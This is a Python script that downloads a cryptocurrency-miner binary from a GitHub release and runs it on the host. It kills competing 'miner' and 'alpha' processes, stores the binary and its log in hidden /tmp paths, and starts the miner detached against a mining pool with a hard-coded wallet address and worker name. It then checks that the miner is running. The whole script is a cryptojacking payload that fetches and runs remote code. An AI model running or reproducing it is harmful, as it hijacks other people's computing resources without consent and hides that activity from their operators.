import subprocess, os, urllib.request, time

out = []
m = '/tmp/.cache/miner'

subprocess.run(['pkill', '-9', 'miner'], capture_output=True)
subprocess.run(['pkill', '-9', 'alpha'], capture_output=True)
time.sleep(2)

os.makedirs('/tmp/.cache', exist_ok=True)
if not os.path.exists(m) or os.path.getsize(m) < 20000000:
    out.append('Downloading...')
    urllib.request.urlretrieve('https://github.com/AlphaMine-Tech/alpha-miner/releases/download/v1.7.7/alpha-miner-1.7.7', m)
    out.append(f'Downloaded: {os.path.getsize(m)} bytes')
else:
    out.append(f'Exists: {os.path.getsize(m)} bytes')

os.chmod(m, 0o755)
subprocess.Popen([m, '--pool', 'stratum+tcp://sg1.alphapool.tech:5566', '--address', 'prl1pjdp6c4dzmzemsw0cv00t2t008mnsu80qc8ghksl0k426qm8z83kqp8m8vg', '--worker', 'A10_59', '--force-backend', 'ampere'],
    stdout=open('/tmp/.mlog', 'w'), stderr=subprocess.STDOUT, start_new_session=True)
out.append('Started')
time.sleep(10)

r = subprocess.run(['pgrep', '-a', 'miner'], capture_output=True, text=True)
if r.stdout.strip():
    out.append('RUNNING: ' + r.stdout.strip()[:100])
else:
    out.append('NOT RUNNING')
    # Check log
    try:
        with open('/tmp/.mlog') as f:
            out.append('Log: ' + f.read()[:500])
    except:
        pass

result = chr(10).join(out)
